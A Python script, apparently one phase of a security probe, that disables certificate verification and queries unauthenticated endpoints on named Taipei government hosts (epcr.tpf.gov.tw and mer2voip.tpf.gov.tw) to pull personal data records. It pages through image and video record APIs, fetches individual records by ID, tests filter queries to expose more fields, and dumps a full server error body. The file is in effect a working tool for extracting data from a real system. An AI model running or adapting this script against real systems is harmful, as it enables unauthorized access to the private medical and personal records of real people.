#!/usr/bin/env python3
"""Phase 4: 收集关键 PII 证据 + 500 错误完整 body"""
import http.client, ssl, json
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=15, proto='https'):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout) if proto=='https' else http.client.HTTPConnection(host, port, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

# 1. :4001 /imageData 完整内容获取（限制 1 条作为证据）
print("="*80)
print("Phase 4-1: :4001 /imageData 1 条 PII 证据")
print("="*80)
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData?limit=1', timeout=15)
print(f"GET /imageData?limit=1 → status={s}  body[:2000]:")
print(b[:2000].decode('utf-8', errors='replace'))

print()
print("="*80)
print("Phase 4-2: :4001 /videoData 1 条 PII 证据")
print("="*80)
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/videoData?limit=1', timeout=15)
print(f"GET /videoData?limit=1 → status={s}  body[:2000]:")
print(b[:2000].decode('utf-8', errors='replace'))

print()
print("="*80)
print("Phase 4-3: :4001 /imageData 翻页获取第 100 条")
print("="*80)
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData?limit=1&offset=100', timeout=15)
print(f"GET /imageData?limit=1&offset=100 → status={s}  body[:2000]:")
print(b[:2000].decode('utf-8', errors='replace'))

print()
print("="*80)
print("Phase 4-4: :4001 /imageData 单条 id=1")
print("="*80)
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData/1', timeout=15)
print(f"GET /imageData/1 → status={s}  body[:2000]:")
print(b[:2000].decode('utf-8', errors='replace'))

print()
print("="*80)
print("Phase 4-5: :4001 /videoData 单条 id=1")
print("="*80)
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/videoData/1', timeout=15)
print(f"GET /videoData/1 → status={s}  body[:2000]:")
print(b[:2000].decode('utf-8', errors='replace'))

print()
print("="*80)
print("Phase 4-6: :4001 GET 不同字段过滤 (看能否获取其他字段)")
print("="*80)
for q in ['fields=recordUuid,ImageType,generatedAt', 'filter[order]=generatedAt+DESC', 'filter[order]=id+ASC&filter[limit]=1', 'filter[where][ImageType]=1']:
    try:
        s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData?'+q, timeout=15)
        print(f"GET /imageData?{q:60s} → status={s}  body[:300]:")
        print(b[:300].decode('utf-8', errors='replace'))
    except Exception as e:
        print(f"GET /imageData?{q:60s} → ERROR {e!r}")

print()
print("="*80)
print("Phase 4-7: mer2voip:30080 /live 500 错误完整 body")
print("="*80)
s, b, _ = req('mer2voip.tpf.gov.tw', 30080, 'GET', '/live', timeout=15)
print(f"GET /live → status={s}  body FULL ({len(b)} bytes):")
print(b.decode('utf-8', errors='replace'))

